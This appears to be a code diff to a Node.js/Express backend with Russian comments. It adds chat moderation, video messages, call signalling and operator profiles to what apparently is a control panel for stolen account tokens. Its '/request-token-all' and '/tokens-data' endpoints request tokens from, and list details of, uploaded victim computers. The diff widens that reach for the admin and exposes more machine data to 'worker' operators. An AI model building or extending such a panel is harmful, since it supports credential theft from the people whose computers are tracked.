@@ -169,10 +169,11 @@ const upload = multer({
 
 // ── Операторы системы (профили по умолчанию, пароли хранятся ТОЛЬКО в MongoDB) ──
 const DEFAULT_SETTINGS = {
-  'Shonll':  { avatar: '🦊', displayName: 'Shonll',  themeColor: '#00f0ff', bio: 'Root Admin' },
-  'DildMan': { avatar: '🐉', displayName: 'DildMan', themeColor: '#ff007f', bio: 'Operator' },
-  'saha_kakaha122': { avatar: '🔗', displayName: 'SVYAZ', themeColor: '#a855f7', bio: 'Operator' },
-  'SinGeR1isss': { avatar: '🎤', displayName: 'SinGeR1isss', themeColor: '#10b981', bio: 'Operator' }
+  'Shonll':        { avatar: '🦊', displayName: 'Shonll',        themeColor: '#00f0ff', bio: 'Root Admin', role: 'Админ' },
+  'DildMan':       { avatar: '🐉', displayName: 'DildMan',       themeColor: '#ff007f', bio: 'Worker',     role: 'Воркер' },
+  'saha_kakaha122': { avatar: '🔗', displayName: 'SVYAZ',         themeColor: '#a855f7', bio: 'Worker',     role: 'Воркер' },
+  'SinGeR1isss':   { avatar: '🎤', displayName: 'SinGeR1isss',   themeColor: '#10b981', bio: 'Worker',     role: 'Воркер' },
+  'HuilaEbanaya':  { avatar: '💀', displayName: 'HuilaEbanaya',  themeColor: '#f97316', bio: 'Worker',     role: 'Воркер' }
 };
 
 const KNOWN_OPERATORS = Object.keys(DEFAULT_SETTINGS);
@@ -224,6 +225,10 @@ function verifyPassword(password, stored) {
 
 function isAdmin(user) {
   return (user || '').toLowerCase() === 'shonll';
+}
+
+function getOperatorRole(user) {
+  return isAdmin(user) ? 'Админ' : 'Воркер';
 }
 
 // ── Определение IP и устройства ───────────────────────────────────────────────
@@ -822,11 +827,34 @@ app.get('/api/admin/sessions', requireAuth, async (req, res) => {
   }
   try {
     const db = await getDb();
+    const now = Date.now();
+    const MAX_INACTIVE_MS = 24 * 60 * 60 * 1000; // 24ч неактивности = автоотзыв
     let sessions = [];
     if (db) {
-      sessions = await db.collection('sessions').find({ revoked: { $ne: true } }).sort({ lastActive: -1 }).limit(100).toArray();
+      const expireBefore = new Date(now - MAX_INACTIVE_MS);
+      await db.collection('sessions').updateMany(
+        { revoked: { $ne: true }, lastActive: { $lt: expireBefore } },
+        { $set: { revoked: true, revokedAt: new Date() } }
+      ).catch(()=>{});
+
+      const rawSessions = await db.collection('sessions').find({ revoked: { $ne: true } }).sort({ lastActive: -1 }).limit(100).toArray();
+
+      for (const s of rawSessions) {
+        const canonical = getCanonicalOperator(s.user);
+        const auth = await getOperatorAuthRecord(canonical);
+        if (auth && auth.kickedAt && s.createdAt && new Date(s.createdAt) < new Date(auth.kickedAt)) {
+          db.collection('sessions').updateOne({ sessionId: s.sessionId }, { $set: { revoked: true, revokedAt: new Date() } }).catch(()=>{});
+          revokedSessionCache.add(s.sessionId);
+          continue;
+        }
+        sessions.push(s);
+      }
     } else if (global.memSessions) {
-      sessions = Array.from(global.memSessions.values()).filter(s => !s.revoked);
+      sessions = Array.from(global.memSessions.values()).filter(s => {
+        if (s.revoked) return false;
+        const diff = now - new Date(s.lastActive || s.createdAt).getTime();
+        return diff < MAX_INACTIVE_MS;
+      });
     }
 
     const currentSid = req.authSessionId || null;
@@ -1000,7 +1028,7 @@ app.post('/api/admin/telegram-test', requireAuth, async (req, res) => {
   }
 });
 
-// ── Список операторов и их публичные профили (аватарки, цвета) ───────────────
+// ── Список операторов и их публичные профили (аватарки, цвета, роли, контакты) ──
 app.get('/api/operators', requireAuth, async (req, res) => {
   try {
     const list = [];
@@ -1009,6 +1037,7 @@ app.get('/api/operators', requireAuth, async (req, res) => {
       const s = await getOperatorSettings(op);
       const lastSeen = operatorPresenceMap.get(op.toLowerCase());
       const isOnline = !!(lastSeen && (now - lastSeen) < 60000);
+      const isMuted = !!(s.isMutedUntil && new Date(s.isMutedUntil) > new Date());
       list.push({
         user: op,
         displayName: s.displayName || op,
@@ -1016,13 +1045,117 @@ app.get('/api/operators', requireAuth, async (req, res) => {
         avatarImage: s.avatarImage || null,
         themeColor: s.themeColor || '#00f0ff',
         bio: s.bio || '',
-        isOnline
+        role: getOperatorRole(op),
+        github: s.github || '',
+        website: s.website || '',
+        telegram: s.telegram || '',
+        isOnline,
+        isMuted,
+        mutedUntil: s.isMutedUntil || null,
+        isBanned: !!s.isBanned
       });
     }
     res.json(list);
   } catch (e) {
     res.json([]);
   }
+});
+
+app.get('/api/operators/:user', requireAuth, async (req, res) => {
+  try {
+    const op = getCanonicalOperator(req.params.user);
+    if (!op) return res.status(404).json({ error: 'Оператор не найден' });
+    const s = await getOperatorSettings(op);
+    const lastSeen = operatorPresenceMap.get(op.toLowerCase());
+    const now = Date.now();
+    const isOnline = !!(lastSeen && (now - lastSeen) < 60000);
+    const isMuted = !!(s.isMutedUntil && new Date(s.isMutedUntil) > new Date());
+    res.json({
+      user: op,
+      displayName: s.displayName || op,
+      avatar: s.avatar || (DEFAULT_SETTINGS[op] && DEFAULT_SETTINGS[op].avatar) || '👤',
+      avatarImage: s.avatarImage || null,
+      themeColor: s.themeColor || '#00f0ff',
+      bio: s.bio || '',
+      role: getOperatorRole(op),
+      github: s.github || '',
+      website: s.website || '',
+      telegram: s.telegram || '',
+      isOnline,
+      isMuted,
+      mutedUntil: s.isMutedUntil || null,
+      isBanned: !!s.isBanned
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Чат: Модерация (Мут и Бан только для Админа) ──────────────────────────────
+app.post('/api/chat/mute', requireAuth, async (req, res) => {
+  if (!isAdmin(req.authUser)) return res.status(403).json({ error: 'Только для администратора' });
+  const { user, durationMinutes } = req.body || {};
+  if (!user) return res.status(400).json({ error: 'Не указан пользователь' });
+  const canonical = getCanonicalOperator(user);
+  if (isAdmin(canonical)) return res.status(400).json({ error: 'Нельзя замутить администратора' });
+
+  const minutes = parseInt(durationMinutes) || 60;
+  const mutedUntil = new Date(Date.now() + minutes * 60 * 1000);
+  const db = await getDb();
+  if (db) {
+    await db.collection('settings').updateOne(
+      { user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') } },
+      { $set: { isMutedUntil: mutedUntil } }
+    );
+  }
+  res.json({ success: true, message: `Оператор ${canonical} замучен на ${minutes} мин.` });
+});
+
+app.post('/api/chat/unmute', requireAuth, async (req, res) => {
+  if (!isAdmin(req.authUser)) return res.status(403).json({ error: 'Только для администратора' });
+  const { user } = req.body || {};
+  if (!user) return res.status(400).json({ error: 'Не указан пользователь' });
+  const canonical = getCanonicalOperator(user);
+  const db = await getDb();
+  if (db) {
+    await db.collection('settings').updateOne(
+      { user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') } },
+      { $unset: { isMutedUntil: '' } }
+    );
+  }
+  res.json({ success: true, message: `Оператор ${canonical} размучен` });
+});
+
+app.post('/api/chat/ban', requireAuth, async (req, res) => {
+  if (!isAdmin(req.authUser)) return res.status(403).json({ error: 'Только для администратора' });
+  const { user } = req.body || {};
+  if (!user) return res.status(400).json({ error: 'Не указан пользователь' });
+  const canonical = getCanonicalOperator(user);
+  if (isAdmin(canonical)) return res.status(400).json({ error: 'Нельзя забанить администратора' });
+
+  const db = await getDb();
+  if (db) {
+    await db.collection('settings').updateOne(
+      { user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') } },
+      { $set: { isBanned: true } }
+    );
+  }
+  res.json({ success: true, message: `Оператор ${canonical} заблокирован в чате` });
+});
+
+app.post('/api/chat/unban', requireAuth, async (req, res) => {
+  if (!isAdmin(req.authUser)) return res.status(403).json({ error: 'Только для администратора' });
+  const { user } = req.body || {};
+  if (!user) return res.status(400).json({ error: 'Не указан пользователь' });
+  const canonical = getCanonicalOperator(user);
+  const db = await getDb();
+  if (db) {
+    await db.collection('settings').updateOne(
+      { user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') } },
+      { $set: { isBanned: false } }
+    );
+  }
+  res.json({ success: true, message: `Оператор ${canonical} разблокирован в чате` });
 });
 
 app.get('/api/debug-db', async (req, res) => {
@@ -1060,7 +1193,7 @@ app.get('/api/settings', requireAuth, async (req, res) => {
 
 app.post('/api/settings', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
-  const { displayName, avatar, avatarImage, themeColor, bio, newPassword, currentPassword } = req.body || {};
+  const { displayName, avatar, avatarImage, themeColor, bio, github, website, telegram, newPassword, currentPassword } = req.body || {};
 
   if (newPassword) {
     const canonical = getCanonicalOperator(user);
@@ -1092,6 +1225,9 @@ app.post('/api/settings', requireAuth, async (req, res) => {
   if (typeof avatarImage === 'string') patch.avatarImage = avatarImage.substring(0, 300000); // Allow up to ~300KB Base64
   if (typeof themeColor === 'string' && /^#[0-9a-fA-F]{6}$/.test(themeColor)) patch.themeColor = themeColor;
   if (typeof bio === 'string') patch.bio = bio.substring(0, 120);
+  if (typeof github === 'string') patch.github = github.trim().substring(0, 100);
+  if (typeof website === 'string') patch.website = website.trim().substring(0, 150);
+  if (typeof telegram === 'string') patch.telegram = telegram.trim().substring(0, 100);
   if (newPassword) patch.password = newPassword;
 
   try {
@@ -1786,16 +1922,22 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
     const user = req.authUser || req.session.user;
     const db = await getDb();
     const now = new Date().toISOString();
+    const opQuery = (user.toLowerCase() === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + escapeRegex(user) + '$', 'i') } };
     if (db) {
       const result = await db.collection('files').updateMany(
-        { operator: user },
+        opQuery,
         { $set: { 'tokenRequest.requested': true, 'tokenRequest.requestedAt': now } }
       );
       console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена у всех: ${result.modifiedCount} компьютеров`);
       res.json({ success: true, count: result.modifiedCount });
     } else {
       let count = 0;
-      for (const doc of (global.memFiles || []).filter(f => f.operator === user)) {
+      for (const doc of (global.memFiles || []).filter(f => {
+        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+        return isOp;
+      })) {
         doc.tokenRequest = { requested: true, requestedAt: now };
         count++;
       }
@@ -1989,6 +2131,7 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
         file: doc.name,
         originalName: doc.originalName || doc.name,
         computer: doc.computer?.name || 'Unknown',
+        computerInfo: doc.computer || {},
         uploadedAt: doc.uploadedAt,
         user: username,
         username: username,
@@ -2260,43 +2403,75 @@ app.post('/api/chat/messages', requireAuth, async (req, res) => {
   try {
     const user = req.authUser || req.session.user || 'operator';
     recordOperatorPresence(user);
-    const { type, text, caption, imageUrl, account, duration, audioUrl } = req.body || {};
+
+    const db = await getDb();
+    if (db) {
+      const sDoc = await db.collection('settings').findOne({
+        user: { $regex: new RegExp('^' + escapeRegex(user) + '$', 'i') }
+      });
+      if (sDoc) {
+        if (sDoc.isBanned) return res.status(403).json({ error: 'Вы заблокированы в чате' });
+        if (sDoc.isMutedUntil && new Date(sDoc.isMutedUntil) > new Date()) {
+          const leftMin = Math.ceil((new Date(sDoc.isMutedUntil) - new Date()) / 60000);
+          return res.status(403).json({ error: `Вы замучены в чате (осталось ${leftMin} мин.)` });
+        }
+      }
+    }
+
+    const { id: clientMsgId, type, text, caption, imageUrl, videoUrl, account, duration, audioUrl } = req.body || {};
     const now = new Date();
     const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 
     const senderSettings = await getOperatorSettings(user);
+    const msgId = (typeof clientMsgId === 'string' && clientMsgId.trim())
+      ? clientMsgId.trim()
+      : ('op_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6));
+
+    const isVideo = type === 'video' || !!videoUrl;
+    const expiresAt = isVideo ? new Date(now.getTime() + 48 * 60 * 60 * 1000) : null;
+
     const msg = {
-      id: 'op_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      id: msgId,
       type: type || 'text',
       user: user,
       displayName: senderSettings.displayName || user,
+      role: getOperatorRole(user),
       avatar: senderSettings.avatar || (DEFAULT_SETTINGS[user] && DEFAULT_SETTINGS[user].avatar) || '👤',
       avatarImage: senderSettings.avatarImage || null,
       time: timeStr,
       createdAt: now.toISOString(),
+      expiresAt: expiresAt ? expiresAt.toISOString() : null,
       text: typeof text === 'string' ? text.substring(0, 4000) : '',
       caption: typeof caption === 'string' ? caption.substring(0, 1000) : '',
       imageUrl: typeof imageUrl === 'string' ? imageUrl : null,
+      videoUrl: typeof videoUrl === 'string' ? videoUrl : null,
       account: account && typeof account === 'object' ? account : null,
       duration: duration || null,
       audioUrl: typeof audioUrl === 'string' ? audioUrl : null
     };
 
-    const db = await getDb();
     if (db) {
       await db.collection('chat_messages').insertOne(msg);
-      // Keep only last 200 in DB
+      // Keep only last 250 in DB
       const count = await db.collection('chat_messages').countDocuments();
-      if (count > 200) {
-        const oldest = await db.collection('chat_messages').find({}).sort({ createdAt: 1 }).limit(count - 200).toArray();
+      if (count > 250) {
+        const oldest = await db.collection('chat_messages').find({}).sort({ createdAt: 1 }).limit(count - 250).toArray();
         const ids = oldest.map(o => o._id);
         await db.collection('chat_messages').deleteMany({ _id: { $in: ids } });
       }
     } else {
       if (!global.memChatMessages) global.memChatMessages = [];
       global.memChatMessages.push(msg);
-      if (global.memChatMessages.length > 200) global.memChatMessages = global.memChatMessages.slice(-200);
+      if (global.memChatMessages.length > 250) global.memChatMessages = global.memChatMessages.slice(-250);
     }
+
+    // Broadcast through SSE
+    sseClients.forEach(client => {
+      try {
+        client.write(`data: ${JSON.stringify({ event: 'new_chat_message', message: msg })}\n\n`);
+      } catch (_) {}
+    });
+
     return res.json({ success: true, message: msg });
   } catch (e) {
     console.error('Chat post error:', e.message);
@@ -2320,10 +2495,121 @@ app.delete('/api/chat/messages/:id', requireAuth, async (req, res) => {
       if (!global.memChatMessages) global.memChatMessages = [];
       global.memChatMessages = global.memChatMessages.filter(m => m.id !== msgId);
     }
+
+    sseClients.forEach(client => {
+      try {
+        client.write(`data: ${JSON.stringify({ event: 'delete_chat_message', id: msgId })}\n\n`);
+      } catch (_) {}
+    });
+
     return res.json({ success: true });
   } catch (e) {
     return res.status(500).json({ error: e.message });
   }
+});
+
+// ── Видеосообщения с автоматическим удалением через 48 часов ──────────────────
+app.post('/api/chat/upload-video', requireAuth, upload.single('video'), async (req, res) => {
+  try {
+    if (!req.file) return res.status(400).json({ error: 'Видео не загружено' });
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    const videoId = 'vid_' + Date.now() + '_' + crypto.randomBytes(6).toString('hex');
+    const expiresAt = new Date(Date.now() + 48 * 60 * 60 * 1000); // 48 часов
+
+    const doc = {
+      videoId,
+      user,
+      mimeType: req.file.mimetype || 'video/mp4',
+      size: req.file.size,
+      data: req.file.buffer,
+      createdAt: new Date(),
+      expiresAt
+    };
+
+    if (db) {
+      await db.collection('chat_videos').insertOne(doc);
+    } else {
+      if (!global.memVideos) global.memVideos = new Map();
+      global.memVideos.set(videoId, doc);
+    }
+
+    return res.json({
+      success: true,
+      videoUrl: `/api/chat/videos/${videoId}`,
+      duration: req.body.duration || null,
+      expiresAt: expiresAt.toISOString()
+    });
+  } catch (e) {
+    console.error('Video upload error:', e.message);
+    return res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/chat/videos/:id', async (req, res) => {
+  try {
+    const videoId = req.params.id;
+    const db = await getDb();
+    let doc = null;
+    if (db) {
+      doc = await db.collection('chat_videos').findOne({ videoId });
+    } else if (global.memVideos) {
+      doc = global.memVideos.get(videoId);
+    }
+    if (!doc) return res.status(404).send('Видео не найдено');
+
+    // Проверка 48 часов
+    if (doc.expiresAt && new Date(doc.expiresAt) < new Date()) {
+      if (db) db.collection('chat_videos').deleteOne({ _id: doc._id }).catch(()=>{});
+      else if (global.memVideos) global.memVideos.delete(videoId);
+      return res.status(410).send('Видео удалено (истекли 48 часов)');
+    }
+
+    res.set('Content-Type', doc.mimeType || 'video/mp4');
+    res.set('Cache-Control', 'public, max-age=86400');
+    return res.send(doc.data.buffer || doc.data);
+  } catch (e) {
+    return res.status(500).send('Ошибка видео');
+  }
+});
+
+// Периодическая зачистка видео через 48 часов (раз в 30 минут)
+setInterval(async () => {
+  try {
+    const db = await getDb();
+    const now = new Date();
+    if (db) {
+      await db.collection('chat_videos').deleteMany({ expiresAt: { $lte: now } });
+      await db.collection('chat_messages').deleteMany({ type: 'video', expiresAt: { $lte: now.toISOString() } });
+    } else if (global.memVideos) {
+      for (const [id, v] of global.memVideos.entries()) {
+        if (v.expiresAt && new Date(v.expiresAt) <= now) global.memVideos.delete(id);
+      }
+    }
+  } catch (_) {}
+}, 30 * 60 * 1000);
+
+// ── WebRTC Звонки (Сигналинг голоса, видео и демонстрации экрана) ─────────────
+app.post('/api/call/signal', requireAuth, (req, res) => {
+  const from = req.authUser || req.session.user;
+  const { to, signal, type, room } = req.body || {};
+  const payload = JSON.stringify({
+    event: 'call_signal',
+    from,
+    to,
+    signal,
+    type,
+    room: room || 'main',
+    timestamp: Date.now()
+  });
+
+  sseClients.forEach(client => {
+    try {
+      client.write(`data: ${payload}\n\n`);
+    } catch (_) {}
+  });
+
+  return res.json({ success: true });
 });
 
 app.post('/api/chat/upload', requireAuth, upload.single('file'), async (req, res) => {
